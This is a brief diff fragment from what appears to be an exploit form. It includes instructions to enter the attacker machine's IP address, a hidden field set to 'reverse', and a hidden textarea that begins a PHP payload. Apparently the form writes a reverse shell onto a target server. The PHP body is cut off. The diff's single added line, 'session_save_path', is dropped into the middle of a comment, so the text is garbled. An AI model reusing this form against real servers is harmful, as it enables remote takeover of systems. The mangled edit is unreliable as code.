@@ -6,6 +6,7 @@
         //THIS LINK LOOKS EXACTLY THE SAME AS YOU CAN SEE HERE. ALSO, DON'T FORGET TO CHANGE THE IP ADDRESS TO THE IP
         //ADDRESS OF THE ATTACKER MACHINE
         <input type="hidden" name="adk" value="reverse" /> //change this "value" according to the name to which you save
+        session_save_path
         your file
         <textarea type="hidden" name="adv">
         <?php
